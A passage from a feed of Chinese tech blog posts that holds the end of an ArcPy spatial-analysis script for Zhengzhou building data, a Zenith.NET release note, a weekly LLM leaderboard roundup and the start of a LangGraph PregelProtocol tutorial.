arcpy.management.FeatureToPoint(input_shp, temp_point_path, \"INSIDE\")\n          \n            out_raster_path = os.path.join(output_base_dir, sub_folders[\"kde\"], f\"{year}年郑州市.tif\")\n            out_kde = arcpy.sa.KernelDensity(temp_point_path, \"height\", 30, None, \"SQUARE_METERS\")\n            out_kde.save(out_raster_path)\n            arcpy.management.Delete(temp_point_path)\n            print(f\" √ 任务1完成: 核密度\")\n            \n            # --- 任务2: 热点分析 ---\n            out_hotspot_path = os.path.join(output_base_dir, sub_folders[\"hotspot\"], f\"{year}年郑州市冷热点.shp\")\n          \n            try:\n                arcpy.stats.HotSpotAnalysis(\n                    input_shp, \"height\", out_hotspot_path,\n                    \"FIXED_DISTANCE_BAND\", \"EUCLIDEAN_DISTANCE\", \"NONE\",\n                    None, None, \"FEATURE_CLASS\"\n                )\n            except AttributeError:\n                try:\n                    arcpy.stats.HotSpotAnalysis_GetisOrdGi(\n                        input_shp, \"height\", out_hotspot_path,\n                        \"FIXED_DISTANCE_BAND\", \"EUCLIDEAN_DISTANCE\", \"NONE\",\n                        None, None, \"FEATURE_CLASS\"\n                    )\n                except AttributeError:\n                    arcpy.HotSpots_stats(input_shp, \"height\", out_hotspot_path)\n                  \n            print(f\" √ 任务2完成: 热点分析\")\n            \n            # --- 任务3: 平均中心 ---\n            out_center_path = os.path.join(output_base_dir, sub_folders[\"mean_center\"], f\"{year}郑州.shp\")\n            arcpy.stats.MeanCenter(input_shp, out_center_path, \"height\")\n          \n            arcpy.management.AddField(out_center_path, \"年份\", \"TEXT\", field_length=10)\n            with arcpy.da.UpdateCursor(out_center_path, [\"年份\"]) as cursor:\n                for row in cursor:\n                    row[0] = str(year)\n                    cursor.updateRow(row)\n            print(f\" √ 任务3完成: 平均中心 (已添加年份字段)\")\n            \n            # --- 任务4: 方向分布 ---\n            out_ellipse_path = os.path.join(output_base_dir, sub_folders[\"ellipse\"], f\"{year}郑州.shp\")\n            arcpy.stats.DirectionalDistribution(input_shp, out_ellipse_path, \"1_STANDARD_DEVIATION\", \"height\")\n          \n            arcpy.management.AddField(out_ellipse_path, \"年份\", \"TEXT\", field_length=10)\n            with arcpy.da.UpdateCursor(out_ellipse_path, [\"年份\"]) as cursor:\n                for row in cursor:\n                    row[0] = str(year)\n                    cursor.updateRow(row)\n            print(f\" √ 任务4完成: 标准差椭圆 (已添加年份字段)\")\n          \n            print(f\" ✓ {year} 年数据处理完成！\")\n          \n        except Exception as e:\n            print(f\" ✗ 处理 {year} 年数据时发生错误: {str(e)}\")\n            import traceback\n            traceback.print_exc()\n            \n    # ================= 最终统计 =================\n    print(\"\\n\" + \"=\"*50)\n    print(\"所有处理已完成！\")\n    print(\"\\n输出结果统计:\")\n    print(\"-\"*30)\n  \n    total_files = 0\n    for folder_key, folder_name in sub_folders.items():\n        folder_path = os.path.join(output_base_dir, folder_name)\n        if os.path.exists(folder_path):\n            if folder_key == \"kde\":\n                files = [f for f in os.listdir(folder_path) if f.endswith('.tif')]\n            else:\n                files = [f for f in os.listdir(folder_path) if f.endswith('.shp')]\n          \n            count = len(files)\n            total_files += count\n            print(f\"{folder_name} 文件夹: {count} 个文件\")\n          \n            if count &gt; 0:\n                print(f\" 示例: {', '.join(files[:3])}\" + (\"...\" if count &gt; 3 else \"\"))\n        else:\n            print(f\"{folder_name} 文件夹: 不存在\")\n  \n    print(f\"\\n总计生成: {total_files} 个结果文件\")\n    print(\"=\"*50)\n\nif __name__ == '__main__':\n    run_analysis()\n</code></pre>\n<p><strong>大白话解释核心逻辑</strong>：</p>\n<ul>\n<li><code>for year in range(1990, 2020)</code>：就像一个自动翻页的书，从 1990 年到 2019 年一张张处理。</li>\n<li>每一年先检查文件是否存在，不存在就跳过（避免程序直接崩溃）。</li>\n<li>核密度：先把面转成点（因为核密度工具需要点），然后计算“哪里点最密集”，输出一张热力图一样的栅格。</li>\n<li>热点分析：直接告诉 ArcGIS “用高度字段找出显著的高值聚集和低值聚集区”。</li>\n<li>平均中心：计算所有点的高度加权中心，就像找一群人的“平均位置”，但高楼影响更大。</li>\n<li>标准差椭圆：画一个椭圆包裹大部分点，显示整体分布的方向和范围。</li>\n<li>每次分析完都会在结果文件里加一个“年份”字段，方便后期合并所有年份一起分析。</li>\n<li>最后统一统计生成了多少文件，给你一个清晰的完成反馈。</li>\n</ul>\n<h2 id=\"常见问题解决\">常见问题解决</h2>\n<ul>\n<li>\n<p><strong>报错 “RuntimeError: Cannot check out Spatial Analyst”</strong><br />\n原因：许可证未启用 Spatial Analyst 扩展。<br />\n解决：在 ArcGIS Pro 中 → 项目 → 许可 → 确认 Spatial Analyst 已勾选。</p>\n</li>\n<li>\n<p><strong>找不到输入文件，提示文件不存在</strong><br />\n原因：路径写错或文件名不完全匹配（区分大小写、后缀完整）。<br />\n解决：仔细检查 <code>input_base_dir</code> 和文件实际位置，确保是原始字符串（加 r 前缀）。</p>\n</li>\n<li>\n<p><strong>热点分析函数报 AttributeError</strong><br />\n原因：不同 ArcGIS 版本函数名不同。<br />\n解决：脚本已内置多种尝试，通常能自动适配；若仍失败，请确认你的 ArcGIS 版本。</p>\n</li>\n<li>\n<p><strong>磁盘空间不足或权限问题</strong><br />\n原因：输出/临时目录无写权限或空间不够。<br />\n解决：选择有足够空间的磁盘，确保当前用户对文件夹有写权限。</p>\n</li>\n<li>\n<p><strong>运行特别慢</strong><br />\n原因：数据量大或电脑配置一般。<br />\n解决：可以先拿几年的数据测试（修改 range(1990, 1995)），确认没问题再跑全部。</p>\n</li>\n</ul>\n<p>按照上面步骤操作，新手也能顺利跑通并得到完整的多年空间分析结果。祝你分析愉快！</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n\t<div class=\"postDesc\">posted on \n<span id=\"post-date\">2026-02-16 13:41</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Laurentianelle\">Laurentianelle</a>&nbsp;\n阅读(<span id=\"post_view_count\">76</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Zenith.NET v0.0.6 发布  — API 大幅精简，为 Metal 后端铺路",
      "link": "https://www.cnblogs.com/xymfblogs/p/19620088",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xymfblogs/p/19620088\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 12:58\">\n    <span>Zenith.NET v0.0.6 发布 🧧 — API 大幅精简，为 Metal 后端铺路</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>大家好！我是 <a href=\"https://github.com/qian-o\" rel=\"noopener nofollow\" target=\"_blank\">@qian-o</a>，Zenith.NET v0.0.6 正式发布了！</p>\n<p>这个版本的核心主题是 <strong>精简</strong>：为了让 API 更好地适配即将上线的 Metal 后端，我们对资源绑定模型、着色器阶段和光线追踪方案做了一次大规模的重构和瘦身。</p>\n<blockquote>\n<p>📦 GitHub 仓库：<a href=\"https://github.com/qian-o/Zenith.NET\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/qian-o/Zenith.NET</a><br />\n📚 文档站点：<a href=\"https://qian-o.github.io/Zenith.NET\" rel=\"noopener nofollow\" target=\"_blank\">https://qian-o.github.io/Zenith.NET</a></p>\n</blockquote>\n<h2 id=\"-项目简介\">🎯 项目简介</h2>\n<p><strong>Zenith.NET</strong> 是一个现代的、跨平台的 .NET 图形与计算库，旨在为 .NET 开发者提供统一的 GPU 编程接口。无论你是要做高性能渲染、图形应用，还是 GPU 通用计算，Zenith.NET 都能帮你屏蔽底层 API 的差异，让代码在不同平台上无缝运行。</p>\n<h2 id=\"-本次更新亮点\">✨ 本次更新亮点</h2>\n<h3 id=\"-resourceset--resourcetable\">🔄 ResourceSet → ResourceTable</h3>\n<p>资源集合从 <code>ResourceSet</code> 全面更名为 <code>ResourceTable</code>，绑定方式也做了简化：</p>\n<p>之前：<code>commandBuffer.SetResourceSet(resourceSet, index);</code><br />\n现在：<code>commandBuffer.SetResourceTable(resourceTable);</code></p>\n<p>不再需要手动传入索引，使用更直观。</p>\n<h3 id=\"-单一-resourcelayout\">📦 单一 ResourceLayout</h3>\n<p>所有管线描述（Graphics / Compute / MeshShading）中的 <code>ResourceLayout[]</code> 统一改为单个 <code>ResourceLayout?</code>。这个改动大幅降低了资源绑定的复杂度，同时也更贴合 Metal 的设计模型，为后续 Metal 后端上线扫清了障碍。</p>\n<h3 id=\"-移除-raytracingpipeline拥抱-rayquery\">🚀 移除 RayTracingPipeline，拥抱 RayQuery</h3>\n<p>这是本次最大的变更。我们移除了独立的 <code>RayTracingPipeline</code>，包括 <code>HitGroup</code>、<code>DispatchRays()</code> 等全部相关 API。</p>\n<p>光线追踪现在统一通过 <strong>RayQuery</strong> 实现，可以在<strong>任意着色器阶段</strong>中使用，不再需要专用的光追管线。这个方向更灵活，跨后端兼容性也更好。</p>\n<h3 id=\"️-清理历史着色器阶段\">✂️ 清理历史着色器阶段</h3>\n<p>移除了 <code>Hull</code>、<code>Domain</code>、<code>Geometry</code> 等传统着色器阶段，以及所有光追专用阶段（<code>RayGeneration</code>、<code>Miss</code>、<code>ClosestHit</code> 等）。<code>PrimitiveTopology</code> 也精简掉了邻接拓扑和 <code>PatchList</code>。</p>\n<p>这些功能在现代图形 API 中已经被 Mesh Shading 和 RayQuery 取代，清理后 API 表面更小更干净。</p>\n<h3 id=\"-meshshading-线程组大小\">📐 MeshShading 线程组大小</h3>\n<p><code>MeshShadingPipelineDesc</code> 新增了 Object 和 Mesh 阶段的线程组大小字段，给予开发者更精细的调度控制。</p>\n<h3 id=\"-apple-平台统一命名\">🍎 Apple 平台统一命名</h3>\n<p>文档和 Issue 模板中原来分开的 \"macOS\" 和 \"iOS\" 统一为 <strong>Apple</strong> 标签，更清晰地表达对整个苹果生态的支持。</p>\n<h2 id=\"️-破坏性变更一览\">⚠️ 破坏性变更一览</h2>\n<p>如果你从 v0.0.5 升级，请注意以下改动：</p>\n<ul>\n<li><code>ResourceSet</code> / <code>ResourceSetDesc</code> → <code>ResourceTable</code> / <code>ResourceTableDesc</code></li>\n<li><code>ResourceLayout[]</code> → <code>ResourceLayout?</code></li>\n<li><code>SetResourceSet(resourceSet, index)</code> → <code>SetResourceTable(resourceTable)</code></li>\n<li><code>RayTracingPipeline</code>、<code>HitGroup</code>、<code>DispatchRays()</code> 已移除，请改用 <strong>RayQuery</strong></li>\n<li><code>Hull</code>、<code>Domain</code>、<code>Geometry</code> 着色器阶段已移除</li>\n<li><code>PrimitiveTopology</code> 邻接拓扑和 <code>PatchList</code> 已移除</li>\n</ul>\n<h2 id=\"️-接下来的计划\">🗺️ 接下来的计划</h2>\n<ul>\n<li><strong>Metal 后端</strong> — 将在近期版本中正式上线，初步计划基于 <a href=\"https://github.com/IsaacMarovitz/SharpMetal\" rel=\"noopener nofollow\" target=\"_blank\">SharpMetal</a> 或 .NET <code>macios</code> TFM 搭建，具体技术路线还在评估中</li>\n<li><strong>SkiaSharp 集成</strong></li>\n</ul>\n<h2 id=\"-当前状态\">🚧 当前状态</h2>\n<ul>\n<li>⚠️ <strong>预览版本</strong> — API 后续仍可能有破坏性变更</li>\n<li>⚠️ <strong>Metal 后端开发中</strong> — macOS / iOS 原生支持即将到来</li>\n<li>✅ <strong>文档已上线</strong> — 入门教程和 API 参考已可用</li>\n<li>✅ <strong>6 大 UI 框架集成</strong> — 覆盖主流 .NET UI 方案</li>\n</ul>\n<h2 id=\"-讨论与反馈\">💬 讨论与反馈</h2>\n<p>如果你有任何疑问、建议、Bug 反馈或功能请求，欢迎通过 GitHub Issues 和 Discussions 交流。</p>\n<hr />\n<p>🧧 今天是除夕，祝全球华人 <strong>2026 新春快乐，马年大吉，万事如意！</strong></p>\n<p>感谢大家的关注和支持，欢迎 Star ⭐ 和提 Issue，我们下个版本见！🚀</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 12:58</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xymfblogs\">o王先生o</a>&nbsp;\n阅读(<span id=\"post_view_count\">131</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "大模型榜单周报（2026/02/15）",
      "link": "https://www.cnblogs.com/xjk15082/p/19619738",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xjk15082/p/19619738\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 10:15\">\n    <span>大模型榜单周报（2026/02/15）</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"1-本周概览\">1. 本周概览</h2>\n<p>本周大模型行业迎来多项重要发布与升级。ChatGPT启动广告测试，谷歌宣布对Gemini3 Deep Think进行重大升级，推出专门针对科学、研究与工程场景的\"推理模式\"。千问团队推进Qwen3.5系列模型发布，字节正式发布新一代视频创作模型Seedance2.0。DeepSeek上线新模型，上下文窗口提升至1M tokens，智谱上线并开源GLM-5，MiniMax上线最新旗舰模型M2.5。OpenRouter榜单出现重大变动，Kimi K2.5从第3名跃升至第1名，使用量翻倍增长125%，Moonshot超越OpenAI成为第三大厂商。Anthropic在多个能力榜单中表现强劲，Claude 4.6包揽编程能力榜单前两名，Text Arena榜单包揽前2名。</p>\n<h2 id=\"2-重点关注事件\">2. 重点关注事件</h2>\n<ul>\n<li><strong>ChatGPT启动广告测试</strong>（2.10）：OpenAI开始在ChatGPT中测试广告功能，标志着商业化探索的新阶段。</li>\n<li><strong>谷歌宣布Gemini 3 Deep Think重大升级</strong>（2.12）：推出专门针对科学、研究与工程场景开发的\"推理模式\"，旨在推动智能前沿发展。</li>\n<li><strong>千问团队推进Qwen 3.5系列发布</strong>（2.9）：已向HuggingFace代码库提交相关支持PR，新系列模型即将面世。</li>\n<li><strong>字节正式发布Seedance 2.0</strong>（2.12）：新一代视频创作模型采用统一的多模态音视频联合生成架构，支持文字、图片、音频、视频四种模态输入，集成了目前业界最全面的多模态内容参考和编辑能力。</li>\n<li><strong>DeepSeek上线新模型</strong>（2.12）：核心升级包括上下文窗口上限提升至1M tokens，长上下文场景表现突出；整体响应速度明显提升；知识库截止日期显示为2025年5月。新模型仍为纯文本模型，不支持多模态输入。目前官方尚未发布正式公告。</li>\n<li><strong>智谱上线并开源GLM-5</strong>（2.12）：定位为面向复杂系统工程和长程Agentic任务的基座模型，在Coding与Agent能力上取得开源SOTA表现。</li>\n<li><strong>MiniMax上线M2.5旗舰模型</strong>（2.12）：最新旗舰模型现已开放访问，用户可通过Web端和桌面端的MiniMax Agent调用该模型。</li>\n</ul>\n<h2 id=\"3-榜单变化\">3. 榜单变化</h2>\n<h3 id=\"openrouter模型调用量排名\">OpenRouter模型调用量排名</h3>\n<ul>\n<li><strong>整体调用量</strong>：Kimi K2.5从第3名跃升至第1名，使用量翻倍增长125%，以1.52T tokens遥遥领先，是第2名的2倍多。Anthropic两个模型新入前十，Claude Opus 4.6入榜。Trinity Large Preview (free)作为免费模型增长81%。另外有两个模型跌出前十：Grok Code Fast 1（上期第8）和Claude Opus 4.5（上期第6，被4.6替代）。</li>\n<li><strong>模型市占率</strong>：Moonshot超越OpenAI，成为OpenRouter平台第三大厂商，与Google、Anthropic并立。Google虽然总量微增（1.58T→1.68T），但市场份额流失近1/6，从23%降到19%。MiniMax份额大增1.7%（4.7%→6.4%），tokens涨80%。</li>\n<li><strong>模型吞吐量</strong>：OpenAI gpt-oss 120B速度暴涨29%（447→576 tok/s），排名反超20B小模型。Meta 3款模型同时进入Top 10，成为入围最多的厂商，Llama 3.3 70B直接挤掉Google Gemini 2.5 Flash Lite，Llama 4系列（Maverick+Scout）双入榜。</li>\n<li><strong>编程调用量</strong>：Kimi在编程场景展现统治力，市占率30.8%，远超其在通用场景的12.6%份额，同时领先第二名近20个百分点。Claude Opus 4.6空降第3，按Anthropic整体下滑。上期Anthropic双模型（Opus 4.5 + Sonnet 4.5）合计16.6%，本期Anthropic双模型（Opus 4.6 + Sonnet 4.5）合计11.3%。</li>\n</ul>\n<h3 id=\"各领域能力榜单\">各领域能力榜单</h3>\n<ul>\n<li><strong>大语言模型Text Arena</strong>：Anthropic包揽前2，终结了Google霸榜，分数突破1500分大关，\"thinking\"版本领先基础版6分。Kimi K2.5-thinking入榜，第18名（1447分）。GLM-5第11名（1452分），智谱成为新的中国质量代表。</li>\n<li><strong>编程能力榜单（Code Arena）</strong>：Claude 4.6霸榜前两名，分数突破1560分，较上期冠军（1500分）提升4.5%；Anthropic包揽前3（含4.5-thinking-32k），保持绝对统治。Google模型被GPT-5.2-high（第4）、GLM-5（第6）超越。智谱GLM-5成为本期最大黑马，直接杀入前6，分数1449分，超越Google Gemini 2.5 Pro。</li>\n<li><strong>文生图能力榜单（Artificial Analysis Text to Image Leaderboard）</strong>：xAI Grok空降第5，xAI首次进入图像生成Top 10，分数1190，超越字节Seedream 4.0（1189）和FLUX.2 [flex]（1184）。</li>\n<li><strong>理科能力榜单（GPQA LLM Stats）</strong>：无重要变化。</li>\n<li><strong>前沿数学能力榜单（EPOCH AI FrontierMath）</strong>：Anthropic 4.6代全面取代4.5代，3款配置全部进入Top 5。Google Gemini 3 Pro Preview下跌，从第4跌至第6。</li>\n<li><strong>HLE（Human's Last Exam）</strong>：无重要变化。</li>\n</ul>\n<h2 id=\"4-排行榜\">4. 排行榜</h2>\n<table>\n<thead>\n<tr>\n<th>测评类型</th>\n<th>第一名</th>\n<th>第二名</th>\n<th>第三名</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>模型调用量</td>\n<td>Kimi K2.5</td>\n<td>Gemini 3 Flash Preview</td>\n<td>DeepSeek V3.2</td>\n</tr>\n<tr>\n<td>公司市占率</td>\n<td>Google</td>\n<td>Anthropic</td>\n<td>MoonShotai</td>\n</tr>\n<tr>\n<td>模型速度</td>\n<td>gpt-oss-safeguard-20b</td>\n<td>Qwen3 32B</td>\n<td>gpt-oss-120b</td>\n</tr>\n<tr>\n<td>编程模型调用量</td>\n<td>Kimi K2.5</td>\n<td>MiniMax M2.1</td>\n<td>Claude Opus 4.6</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"各公司按不同能力领域排名汇总\">各公司按不同能力领域排名汇总</h3>\n<table>\n<thead>\n<tr>\n<th>测评类型</th>\n<th>领先公司</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>大语言模型 Text Arena</td>\n<td>Anthropic、Google、xAI、OpenAI</td>\n</tr>\n<tr>\n<td>编程能力 Code Arena</td>\n<td>Anthropic、OpenAI、智谱、Google、Kimi</td>\n</tr>\n<tr>\n<td>编程能力 LiveCodeBench</td>\n<td>Anthropic、OpenAI、Google</td>\n</tr>\n<tr>\n<td>代码工程任务能力 SWE-bench</td>\n<td>Anthropic、Google、OpenAI</td>\n</tr>\n<tr>\n<td>图像编辑和生成能力 Image Edit Arena</td>\n<td>OpenAI、Google、xAI、字节、腾讯</td>\n</tr>\n<tr>\n<td>文生图能力 Text-to-Image Arena</td>\n<td>OpenAI、Google、xAI、Black Forest Labs、腾讯</td>\n</tr>\n<tr>\n<td>图像编辑和生成能力 Image Editing Leaderboard</td>\n<td>OpenAI、Google、xAI、腾讯、字节、Black Forest Labs、阿里巴巴、Reve</td>\n</tr>\n<tr>\n<td>文生图能力 Text to Image Leaderboard</td>\n<td>OpenAI、Google、Black Forest Labs、xAI、字节</td>\n</tr>\n<tr>\n<td>GPQA</td>\n<td>OpenAI、Google、Anthropic、xAI</td>\n</tr>\n<tr>\n<td>FrontierMath</td>\n<td>OpenAI、Anthropic、Google、月之暗面、DeepSeek</td>\n</tr>\n<tr>\n<td>Humanity's Last Exam</td>\n<td>Google、OpenAI、Anthropic</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<p>关注我，第一时间掌握更多AI前沿资讯！</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 10:15</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xjk15082\">KAI智习</a>&nbsp;\n阅读(<span id=\"post_view_count\">115</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "[拆解LangChain执行引擎] PregelProtocol——定义了\"LangChain执行体\"最小功能集",
      "link": "https://www.cnblogs.com/jaydenai/p/19619278/pregel-protocol",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/jaydenai/p/19619278/pregel-protocol\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 07:22\">\n    <span>[拆解LangChain执行引擎] PregelProtocol——定义了\"LangChain执行体\"最小功能集</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        Pregel是对PregelProtocol协议的实现，后者的引入标志着 LangGraph 从一个单一的库进化为了一个可插拔的图计算框架。图可以视为“LangGraph 执行体”，而PregelProtocol定义了它必须具备的最小功能集合\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>Pregel是对<code>PregelProtocol</code>协议的实现，后者的引入标志着 LangGraph 从一个单一的库进化为了一个可插拔的图计算框架。图可以视为“LangGraph 执行体”，而PregelProtocol定义了它必须具备的最小功能集合。我们从这协议的成员定义来看看这个功能集合包含哪些操作。</p>\n<h2 id=\"1-配置绑定\">1. 配置绑定</h2>\n<p>通过前面的内容我们会发现<code>RunnableConfig</code>这个对象几乎时无所不在，我们在调用Pregel对象的时候可以将它作为参数，用来提供用于控制其执行行为（比如迭代限制，并发控制等）的配置。执行引擎还将它作为容器用来下流流程传递一些组件和信号，所以前面的演示实例才可以在Node处理函数中从注入的RunnableConfig中提取像<code>Runtime</code>、<code>PregelScratchpad</code>、<code>Checkpoint命名空间</code>和<code>静态上下文</code>这样对象和信息。对于单纯Pregel的Node（不包括StateGraph的Node），RunnableConfig使唯一可以注入到处理函数中的参数，所以除了输入参数，其他所需的信息只能从它里面提取。</p>\n<p><code>with_config</code>方法赋予了这个 “执行体”与配置绑定的能力。除了提供RunnableConfig对象，我们还可以利用关键词参数提供待绑定的配置。由于RunnableConfig本质上就是一个TypedDict对象，提供的关键字参数组成的键值对可以直接转换成RunnableConfig对象。with_config方法会将两者合并，生成一个新的RunnableConfig对象绑定到执行体上。</p>\n<pre><code class=\"language-python\">class PregelProtocol(Runnable[InputT, Any], Generic[StateT, ContextT, InputT, OutputT]):\n    @abstractmethod\n    def with_config(\n        self, config: RunnableConfig | None = None, **kwargs: Any\n    ) -&gt; Self: ...\n</code></pre>\n<h2 id=\"2-可视化呈现\">2. 可视化呈现</h2>\n<p>PregelProtocol是LangGraph对 “图” 的抽象，这里的图是 “图论” 的概念，但是若真能将它的结构呈现在一张 “图片” 中，这无疑是非常有意义的。毕竟代码仅仅是面向程序员的语言，比不上图片，不但直观，还没有受众限制。LangGraph专门定义了如下这个Graph类型来表示面向 “可视化呈现” 的图。</p>\n<p>一个Graph对象标识的图依然由Node和Edge构成。它的每个Node都有一个唯一标识，我们可以调用<code>next_id</code>方法为下一个待添加的Node生成此标识。我们不仅可以调用<code>add_node</code>、<code>remove_node</code>和<code>add_edge</code>这样的方法以添加/移除Node和Edge来构建图，还可以调用<code>extend</code>方法将另一个Graph的所有Node和Edge添加进来。</p>\n<pre><code class=\"language-python\">@dataclass\nclass Graph:\n    nodes: dict[str, Node] = field(default_factory=dict)\n    edges: list[Edge] = field(default_factory=list)\n    \n    def next_id(self) -&gt; str\n    def add_node(\n        self,\n        data: type[BaseModel] | RunnableType | None,\n        id: str | None = None,\n        *,\n        metadata: dict[str, Any] | None = None,\n    ) -&gt; Node\n    def remove_node(self, node: Node) -&gt; None\n    def add_edge(\n        self,\n        source: Node,\n        target: Node,\n        data: Stringifiable | None = None,\n        conditional: bool = False,  # noqa: FBT001,FBT002\n    ) -&gt; Edge\n    def extend(\n        self, graph: Graph, *, prefix: str = \"\"\n    ) -&gt; tuple[Node | None, Node | None]:\n\n    def reid(self) -&gt; Graph:\n    def first_node(self) -&gt; Node | None\n    def last_node(self) -&gt; Node | None\n    def trim_first_node(self) -&gt; None\n    def trim_last_node(self) -&gt; None\n\n    def to_json(self, *, with_schemas: bool = False) -&gt; dict[str, list[dict[str, Any]]]\n    def draw_ascii(self) -&gt; str:\n    def print_ascii(self) -&gt; None:\n    @overload\n    def draw_png(\n        self,\n        output_file_path: str,\n        fontname: str | None = None,\n        labels: LabelsDict | None = None,\n    ) -&gt; None: ...\n    @overload\n    def draw_png(\n        self,\n        output_file_path: None,\n        fontname: str | None = None,\n        labels: LabelsDict | None = None,\n    ) -&gt; bytes: ...\n    def draw_png(\n        self,\n        output_file_path: str | None = None,\n        fontname: str | None = None,\n        labels: LabelsDict | None = None,\n    ) -&gt; bytes | None\n    def draw_mermaid(\n        self,\n        *,\n        with_styles: bool = True,\n        curve_style: CurveStyle = CurveStyle.LINEAR,\n        node_colors: NodeStyles | None = None,\n        wrap_label_n_words: int = 9,\n        frontmatter_config: dict[str, Any] | None = None,\n    ) -&gt; str\n    def draw_mermaid_png(\n        self,\n        *,\n        curve_style: CurveStyle = CurveStyle.LINEAR,\n        node_colors: NodeStyles | None = None,\n        wrap_label_n_words: int = 9,\n        output_file_path: str | None = None,\n        draw_method: MermaidDrawMethod = MermaidDrawMethod.API,\n        background_color: str = \"white\",\n        padding: int = 10,\n        max_retries: int = 1,\n        retry_delay: float = 1.0,\n        frontmatter_config: dict[str, Any] | None = None,\n        base_url: str | None = None,\n        proxies: dict[str, str] | None = None,\n    ) -&gt; bytes\n</code></pre>\n<p>调用<code>reid</code>方法可以返回一个新的Graph对象，它尽量保留途中可读性的元素，但是Node的ID会重新生成。Graph的<code>first_node</code>和<code>last_node</code>方法返回第一个和最后一个Node。如果我们希望删除第一个只有单一输出Edge或者最后一个只有单一输入Edge的Node，可以调用<code>trim_first_node</code>或者<code>trim_last_node</code>方法。</p>\n<p>构建好的Graph可以采用不同的呈现方式。Graph提供了五个“绘图”方法，其中<code>draw_ascii</code>和<code>print_ascii</code>采用ascii码字符的呈现方式，前者返回具体的ascii码字符串，后者则直接在终端将图绘制出来，这种方法不依赖其他的绘图相关的包。<code>draw_mermaid</code>和<code>draw_mermaid_png</code>采用Mermaid图表的呈现方式，Mermaid 是一种基于文本的流程图定义语言，广泛支持于 GitHub、Notion 和各种编辑器中。draw_mermaid返回图标文本，而<code>draw_mermaid_png</code>则直接将图表进一步渲染成PNG图片。Graph对象也可以通过调用<code>draw_png</code>方法渲染成PNG图片，该方法最终会Graphviz（一个开源的图可视化软件）来布局和渲染图片。</p>\n<p>再回到PregelProtocol类型的定义上，它定义了如下所示的<code>get_graph/aget_graph</code>方法，它们的返回类型DrawableGraph正是上述Graph类型的别名。该方法除了可以传入RunnableConfig对象作为可选配置外，还具有一个名为<code>xray</code>的参数。xray（X光）参数决定了你在查看图结构时，到底能看多深。它专门用于处理子图的展开显示。如果设置为False（默认值），图将以 “黑盒” 模式显式，如果你的图中包含子图，它只会显示为一个单一的节点。你看不见子图内部的任何节点、边或逻辑。反之将会采用 “全展开” 模式，它会像 X 光一样穿透所有层级，将所有嵌套子图内部的节点和连线全部平铺出来。</p>\n<pre><code class=\"language-python\">from langchain_core.runnables.graph import Graph as DrawableGraph\nclass PregelProtocol(Runnable[InputT, Any], Generic[StateT, ContextT, InputT, OutputT]):\n    @abstractmethod\n    def get_graph(\n        self,\n        config: RunnableConfig | None = None,\n        *,\n        xray: int | bool = False,\n    ) -&gt; DrawableGraph: ...\n\n    @abstractmethod\n    async def aget_graph(\n        self,\n        config: RunnableConfig | None = None,\n        *,\n        xray: int | bool = False,\n    ) -&gt; DrawableGraph: ...\n</code></pre>\n<p>在第一个演示实例中，我们创建了一个作为“笑话生成器”的Agent，现在我们将它简化，看看由它生成的Graph如何将图的结构以可视化的形式呈现出来。如下面的代码片段所示，我们利用StateGraph作为Builder，构建了一张由两个Node组成的图，它们和Start和End之间有四条边。</p>\n<pre><code class=\"language-python\">from langgraph.graph import StateGraph, START, END\nfrom langgraph.pregel.protocol import PregelProtocol\nfrom PIL import Image as PILImage\nimport io\nfrom langgraph.checkpoint.memory import MemorySaver\n\ndef generate_joke(state):\n    pass\n\ndef regenerate_joke(state):\n    pass\n\nbuilder = (\n    StateGraph(dict)\n    .add_node(\"generate_joke\", generate_joke)\n    .add_node(\"regenerate_joke\", regenerate_joke)\n)\n\nbuilder.add_edge(START, \"generate_joke\")\nbuilder.add_edge(\"regenerate_joke\", END)\nbuilder.add_conditional_edges(\n    \"generate_joke\", lambda _: \"bad\", {\"good\": END, \"bad\": \"regenerate_joke\"}\n)\n\napp: PregelProtocol = builder.compile(MemorySaver())\ngraph = app.get_graph()\ngraph.print_ascii()\n\nbytes = 